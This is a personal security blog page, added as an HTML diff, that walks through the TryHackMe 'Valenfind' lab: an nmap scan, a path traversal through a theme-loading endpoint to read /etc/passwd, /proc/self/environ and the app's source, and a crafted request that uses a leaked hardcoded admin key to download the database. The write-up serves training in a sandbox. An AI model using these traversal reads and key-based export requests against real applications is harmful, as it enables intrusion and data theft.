@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - Valenfind Write-up | Parthiv Kumar Nikku</title>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/x-icon" href="../../assets/logos/favicon.ico">
+
+  <!-- Blog CSS -->
+  <link rel="stylesheet" href="../css/blog.css">
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav class="blog-navbar">
+    <div class="nav-left">
+      <a href="../index.html" class="nav-link">
+        <i class="fas fa-blog"></i> Blog
+      </a>
+    </div>
+
+    <div class="nav-links">
+      <a href="../../index.html" class="nav-link">
+        <i class="fas fa-arrow-left"></i> Portfolio
+      </a>
+    </div>
+
+    <!-- Theme Toggle - Single Icon -->
+    <div class="theme-toggle" id="theme-toggle" title="Toggle theme">
+      <span class="icon sun"><i class="fas fa-sun"></i></span>
+      <span class="icon moon"><i class="fas fa-moon"></i></span>
+    </div>
+
+    <!-- Mobile Menu Button - Hamburger Style -->
+    <button class="mobile-menu-btn" id="mobile-menu-btn" aria-label="Toggle menu">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </nav>
+
+  <!-- MAIN LAYOUT -->
+  <main class="blog-layout">
+    
+    <!-- SIDEBAR -->
+    <aside class="blog-sidebar" id="blog-sidebar">
+      <h3><i class="fas fa-list"></i> Blog Posts</h3>
+      <ul>
+        <li><a href="IITB25-Breached-Writeup.html"><i class="fas fa-file-alt"></i> Breached<br></a></li><li><a href="THM-Valenfind.html"><i class="fas fa-file-alt"></i> THM - Valenfind Write-up</a></li><li><a href="template.html"><i class="fas fa-file-alt"></i> Your Awesome Write-up Title"<br></a></li>
+      </ul>
+      
+      <h3 style="margin-top: 2rem;"><i class="fas fa-link"></i> Quick Links</h3>
+      <ul>
+        <li>
+          <a href="../../index.html">
+            <i class="fas fa-home"></i> Main Portfolio
+          </a>
+        </li>
+        <li>
+          <a href="../../html/certifications.html">
+            <i class="fas fa-certificate"></i> Certifications
+          </a>
+        </li>
+        <li>
+          <a href="../../html/projects.html">
+            <i class="fas fa-project-diagram"></i> Projects
+          </a>
+        </li>
+      </ul>
+    </aside>
+    
+    <!-- Sidebar Overlay (Mobile) -->
+    <div class="sidebar-overlay" id="sidebar-overlay"></div>
+    
+    <!-- Sidebar Toggle Button (Mobile) -->
+    <button class="sidebar-toggle" id="sidebar-toggle" aria-label="Toggle sidebar">
+      <i class="fas fa-bars"></i>
+    </button>
+    
+    <!-- CONTENT AREA -->
+    <article class="blog-content">
+      <header class="post-header">
+        <h1 class="post-title">THM - Valenfind Write-up</h1>
+        
+
+        <div class="meta-row">
+          <span class="meta-item"><i class="fas fa-calendar-alt"></i> 2026-02-14</span>
+          <span class="meta-item"><i class="fas fa-clock"></i> 7 min read</span>
+          <span class="meta-item"><i class="fas fa-user"></i> Parthiv Kumar Nikku</span>
+          
+          
+          <span class="meta-item tags"><span class="tag tag-tryhackme">tryhackme</span><span class="tag tag-web">web</span><span class="tag tag-path-traversal">path-traversal</span><span class="tag tag-medium">medium</span></span>
+          
+        </div>
+      </header>
+
+      <div class="post-body"><blockquote>
+<p>Challange Description:
+There’s this new dating app called “Valenfind” that just popped up out of nowhere. The creator only learned to code this year — which suggests insecure design decisions. The objective was to identify and exploit weaknesses in the web application to retrieve the flag.</p>
+</blockquote>
+<h2>Challenge Metadata</h2>
+<ul>
+<li><strong>Room Name:</strong> Valenfind  </li>
+<li><strong>Platform:</strong> TryHackMe  </li>
+<li><strong>URL:</strong> <a href="https://tryhackme.com/room/lafb2026e10">Link to challange</a></li>
+<li><strong>Difficulty:</strong> Medium  </li>
+<li><strong>Category:</strong> Web  </li>
+<li><strong>Points:</strong> 200  </li>
+</ul>
+<hr />
+<h3>Scanning</h3>
+<p>I started scanning the target for potential open ports.. and i found the ssh port open.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ nmap -sV -A -p22 -sC $TARGET
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 16:21 IST
+Nmap scan report for 10.49.137.221
+Host is up (0.086s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 fe:1f:8d:7f:92:38:3d:71:87:9d:01:65:de:03:4d:8c (ECDSA)
+|_  256 db:63:1e:b8:e4:25:80:10:18:d1:c3:7f:45:9b:2d:63 (ED25519)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
+Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Lin
+ux 3.1 - 3.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   87.80 ms 192.168.128.1
+2   ...
+3   88.40 ms 10.49.137.221
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds
+
+</code></pre>
+<ul>
+<li>
+<p>I tried connecting to it to check if i can use hydra to brute-force the password but yea, its key based authentication..</p>
+</li>
+<li>
+<p>I then headed to the target webapp to start scanning.</p>
+</li>
+<li>
+<p>I created an account in the application and then logged in.. initially i thought its a injection kinda stuff but realized not because we have option to sign up!.</p>
+</li>
+<li>
+<p>One user amongest all seems suspecious for me.. the <code>cupid</code> his discription says something like this - <em>"I keep the database secure. No peeking."</em> and this guy caught my attention for obvious reasons</p>
+</li>
+<li>
+<p>but no lead for a while and slowly i noticed a option to change the profile theme.</p>
+</li>
+</ul>
+<figure class="post-figure" id="fig-2-1">
+  <img src="../../assets/images/writeups/Pasted image 20260214173729.png" alt="Pasted image 20260214173729"/>
+  <figcaption>Fig2.1 - Pasted image 20260214173729</figcaption>
+</figure>
+
+<p>Opened up burp suite and noticed that the profile themes are being fetched dynamically.</p>
+<figure class="post-figure" id="fig-2-2">
+  <img src="../../assets/images/writeups/2026-02-14_17-03-18.png" alt="2026-02-14_17-03-18"/>
+  <figcaption>Fig2.2 - 2026-02-14_17-03-18</figcaption>
+</figure>
+
+<p>The endpoint is <code>/api/fetch_layout</code></p>
+<p>Time for [[Path Traversal]], tried to fetch the <code>/etc/passwd</code></p>
+<figure class="post-figure" id="fig-2-3">
+  <img src="../../assets/images/writeups/2026-02-14_16-26-40.png" alt="2026-02-14_16-26-40"/>
+  <figcaption>Fig2.3 - 2026-02-14_16-26-40</figcaption>
+</figure>
+
+<h3>some commands that made my work easier</h3>
+<p>In linux we have </p>
+<blockquote>
+<p><code>/proc/self/cmdline</code>
+The command stated will return the exact process that handles/started current process, (self).
+In this case all the processes are being handeled by the webapp and hence this returns the file that is responsible for this process.</p>
+<p><code>/proc/self/envron</code>
+This is quite obvyous -  returns the environment variables</p>
+</blockquote>
+<figure class="post-figure" id="fig-2-4">
+  <img src="../../assets/images/writeups/2026-02-14_16-37-54.png" alt="2026-02-14_16-37-54"/>
+  <figcaption>Fig2.4 - 2026-02-14_16-37-54</figcaption>
+</figure>
+
+<p>The above screenshot show the path of the <code>app.py</code></p>
+<p>Now i tried to read up the source code of the app and the code has the following details:</p>
+<figure class="post-figure" id="fig-2-5">
+  <img src="../../assets/images/writeups/2026-02-14_16-51-42.png" alt="2026-02-14_16-51-42"/>
+  <figcaption>Fig2.5 - 2026-02-14_16-51-42</figcaption>
+</figure>
+
+<pre><code class="language-python">ADMIN_API_KEY = &quot;CUPID_MASTER_KEY_2024_XOXO&quot;
+</code></pre>
+<pre><code class="language-python">@app.route('/api/admin/export_db')
+def export_db():
+    auth_header = request.headers.get('X-Valentine-Token')
+
+    if auth_header == ADMIN_API_KEY:
+        try:
+            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
+        except Exception as e:
+            return str(e)
+    else:
+        return jsonify({&quot;error&quot;: &quot;Forbidden&quot;, &quot;message&quot;: &quot;Missing or Invalid Admin Token&quot;}), 403
+</code></pre>
+<p>examining the above evidences, we can create a web request accordingly:</p>
+<pre><code class="language-nginx">GET /api/admin/export_db HTTP/1.1
+Host: 10.49.137.221:5000
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: */*
+Referer: http://10.49.137.221:5000/profile/cupid
+Accept-Encoding: gzip, deflate, br
+X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
+Cookie: session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjEwLCJ1c2VybmFtZSI6InRlc3QxIn0.aZBT-Q.p7M_b3Nv53KBtJd2E0oSRDFE-ek
+Connection: keep-alive
+
+
+</code></pre>
+<figure class="post-figure" id="fig-2-6">
+  <img src="../../assets/images/writeups/2026-02-14_17-00-44 1.png" alt="2026-02-14_17-00-44 1"/>
+  <figcaption>Fig2.6 - 2026-02-14_17-00-44 1</figcaption>
+</figure>
+
+<p>This brings up the flag.</p></div>
+    </article>
+    
+  </main>
+
+  <!-- FOOTER -->
+  <footer style="text-align: center; padding: 1.5rem; border-top: 1px solid var(--border-color); background: var(--bg-secondary);">
+    <p>&copy; 2026 Parthiv Kumar Nikku | Security Blog</p>
+    <p style="font-size: 0.9rem; color: var(--text-muted); margin-top: 0.5rem;">
+      <i class="fas fa-lock"></i> Secured with &lt;/&gt; and coffee
+    </p>
+  </footer>
+
+  <!-- JavaScript -->
+  <script src="../js/blog.js"></script>
+</body>
+</html>
